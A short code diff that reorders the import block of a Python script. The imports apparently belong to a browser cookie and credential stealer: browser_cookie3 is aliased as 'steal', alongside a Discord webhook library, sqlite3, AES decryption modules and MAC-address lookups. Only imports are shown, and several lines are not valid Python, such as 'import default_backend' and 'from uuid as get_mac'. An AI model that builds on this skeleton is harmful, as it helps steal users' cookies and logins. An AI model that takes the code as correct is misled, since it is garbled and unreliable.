@@ -4,7 +4,6 @@ import psutil
 import default_backend
 import AESGCM
 import platform
-import (Cipher, algorithms, modes)
 import json
 import getnode
 from datetime import datetime
@@ -18,7 +17,7 @@ import requests
 import subprocess
 from uuid as get_mac
 import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
-from cryptography.hazmat.primitives.ciphers
+from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from cryptography.hazmat.primitives.ciphers.aead
 from cryptography.hazmat.backends
 from Crypto.Cipher import AES
